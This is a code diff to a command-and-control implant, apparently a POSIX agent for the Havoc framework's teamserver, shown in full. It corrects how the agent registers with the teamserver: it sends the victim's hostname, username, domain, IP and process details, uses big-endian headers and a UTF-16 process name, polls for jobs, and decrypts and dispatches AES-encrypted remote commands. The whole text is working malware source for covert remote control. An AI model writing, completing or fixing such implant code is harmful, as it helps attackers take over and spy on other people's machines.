@@ -242,13 +242,22 @@ uint8_t *BuildRegisterPacket(size_t *out_len)
 #define PUT64(v)  PkgAddInt64(tmp, (int64_t)(v))
 #define PUTSTR(v) PkgAddString(tmp, (v))
 
+    /* Convert ProcessName to UTF-16LE as the server calls ParseUTF16String() */
+    size_t pname_utf8_len = strlen(s->ProcessName);
+    size_t pname_utf16_len = pname_utf8_len * 2; /* ASCII → 2 bytes each in UTF-16LE */
+    uint8_t *pname_utf16 = (uint8_t *)calloc(1, pname_utf16_len + 2);
+    for (size_t i = 0; i < pname_utf8_len; i++) {
+        pname_utf16[i * 2]     = (uint8_t)s->ProcessName[i];
+        pname_utf16[i * 2 + 1] = 0;
+    }
+
     PUT32(s->AgentID);
     PUTSTR(s->Hostname);
     PUTSTR(s->Username);
     PUTSTR(s->Domain);
     PUTSTR(s->InternalIP);
-    PUTSTR(s->ProcessName);   /* teamserver reads this as UTF-16 on Windows but
-                                 handles UTF-8 strings from POSIX agents */
+    PkgAddBytes(tmp, pname_utf16, (uint32_t)pname_utf16_len); /* UTF-16LE, no NUL */
+    free(pname_utf16);
     PUT32(s->ProcessPID);
     PUT32(s->ProcessPID);     /* TID == PID on POSIX */
     PUT32(s->ProcessPPID);
@@ -298,29 +307,21 @@ uint8_t *BuildRegisterPacket(size_t *out_len)
     uint8_t *frame = (uint8_t *)malloc(total);
     if (!frame) { free(enc_buf); *out_len = 0; return NULL; }
 
+    /* The teamserver parser uses BIG-ENDIAN for all header fields.
+     * Write every uint32 MSB-first so ParseHeader + ParseInt32() read correctly. */
+#define PUT_BE32(buf, off, val) do { \
+    (buf)[(off)++] = (uint8_t)((val) >> 24); \
+    (buf)[(off)++] = (uint8_t)((val) >> 16); \
+    (buf)[(off)++] = (uint8_t)((val) >>  8); \
+    (buf)[(off)++] = (uint8_t)((val)       ); \
+} while (0)
+
     size_t off = 0;
-    /* SIZE = total - 4 */
-    frame[off++] = (uint8_t)((hdr_size + body_size));
-    frame[off++] = (uint8_t)((hdr_size + body_size) >> 8);
-    frame[off++] = (uint8_t)((hdr_size + body_size) >> 16);
-    frame[off++] = (uint8_t)((hdr_size + body_size) >> 24);
-    /* MAGIC */
-    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE);
-    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE >> 8);
-    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE >> 16);
-    frame[off++] = (uint8_t)(DEMON_MAGIC_VALUE >> 24);
-    /* AgentID */
-    frame[off++] = (uint8_t)(s->AgentID);
-    frame[off++] = (uint8_t)(s->AgentID >> 8);
-    frame[off++] = (uint8_t)(s->AgentID >> 16);
-    frame[off++] = (uint8_t)(s->AgentID >> 24);
-    /* COMMAND_CHECKIN */
-    frame[off++] = (uint8_t)(COMMAND_CHECKIN);
-    frame[off++] = (uint8_t)(COMMAND_CHECKIN >> 8);
-    frame[off++] = (uint8_t)(COMMAND_CHECKIN >> 16);
-    frame[off++] = (uint8_t)(COMMAND_CHECKIN >> 24);
-    /* RequestID = 0 */
-    memset(frame + off, 0, 4); off += 4;
+    PUT_BE32(frame, off, (uint32_t)(hdr_size + body_size)); /* SIZE  */
+    PUT_BE32(frame, off, (uint32_t)DEMON_MAGIC_VALUE);      /* MAGIC */
+    PUT_BE32(frame, off, (uint32_t)s->AgentID);             /* AGENT_ID */
+    PUT_BE32(frame, off, (uint32_t)COMMAND_CHECKIN);        /* COMMAND = 99 */
+    PUT_BE32(frame, off, 0u);                               /* REQUEST_ID = 0 */
     /* AES Key */
     memcpy(frame + off, enc->AesKey, AES_KEY_SIZE); off += AES_KEY_SIZE;
     /* AES IV */
@@ -396,9 +397,9 @@ void RuntimeLoop(void)
             continue;
         }
 
-        /* Send a check-in beacon (empty PKG so the server knows we are alive
-         * and returns any queued jobs) */
-        PKG_BUFFER *checkin = PkgCreate(COMMAND_CHECKIN, 0);
+        /* Send a COMMAND_GET_JOB beacon (= 1) to request pending jobs.
+         * COMMAND_CHECKIN (99) = DEMON_INIT is only used during registration. */
+        PKG_BUFFER *checkin = PkgCreate(COMMAND_GET_JOB, 0);
         size_t      msg_len = 0;
         uint8_t    *msg     = PkgBuildMessage(checkin,
                                               enc->AesKey, enc->AesIv,
@@ -409,21 +410,17 @@ void RuntimeLoop(void)
         size_t   resp_len = 0;
 
         if (msg && TransportSendRecv(msg, msg_len, &resp, &resp_len) == 0
-                && resp_len > 12) {
-            /* Parse and dispatch all jobs returned */
+                && resp_len >= 4) {
+            /* The server response from BuildPayloadMessage is a flat list of job
+             * packets with NO outer SIZE+MAGIC+AGENTID header:
+             *   [4 LE] cmdID
+             *   [4 LE] reqID
+             *   [4 LE] dataSize
+             *   [N]    AES-CTR encrypted data  (only if dataSize > 0)
+             * All integers are little-endian (Go binary.LittleEndian). */
             PARSER *p = ParserNew(resp, resp_len);
             if (p) {
-                /* Skip outer frame header: SIZE(4) MAGIC(4) AGENTID(4) */
-                ParserReadInt32(p); /* SIZE */
-                ParserReadInt32(p); /* MAGIC */
-                ParserReadInt32(p); /* AGENTID */
-
-                /* Decrypt payload if present */
-                if (p->Length >= 4) {
-                    ParserDecrypt(p, enc->AesKey, enc->AesIv);
-                }
-
-                /* Dispatch each command in the payload */
+                /* Dispatch each job packet */
                 while (p->Length >= 12) {
                     uint32_t cmdID = (uint32_t)ParserReadInt32(p);
                     uint32_t reqID = (uint32_t)ParserReadInt32(p);
@@ -431,13 +428,29 @@ void RuntimeLoop(void)
 
                     if (dsize > p->Length) break;
 
-                    PARSER *cmd_parser = ParserNew(p->Buffer, dsize);
-                    p->Buffer += dsize;
-                    p->Length -= dsize;
-
-                    if (cmd_parser) {
-                        CommandDispatcher(cmdID, reqID, cmd_parser);
-                        ParserFree(cmd_parser);
+                    /* Decrypt the data section if present */
+                    if (dsize > 0) {
+                        uint8_t *enc_data = p->Buffer;
+                        uint8_t *dec_data = (uint8_t *)malloc(dsize);
+                        if (dec_data) {
+                            size_t dec_len = 0;
+                            AES256_Decrypt(enc_data, dsize, dec_data, &dec_len,
+                                           enc->AesKey, enc->AesIv);
+                            PARSER *cmd_parser = ParserNew(dec_data, dec_len);
+                            free(dec_data);
+                            p->Buffer += dsize;
+                            p->Length -= dsize;
+                            if (cmd_parser) {
+                                CommandDispatcher(cmdID, reqID, cmd_parser);
+                                ParserFree(cmd_parser);
+                            }
+                        } else {
+                            p->Buffer += dsize;
+                            p->Length -= dsize;
+                        }
+                    } else {
+                        /* COMMAND_NOJOB — no data, just heartbeat */
+                        CommandDispatcher(cmdID, reqID, NULL);
                     }
                 }
                 ParserFree(p);
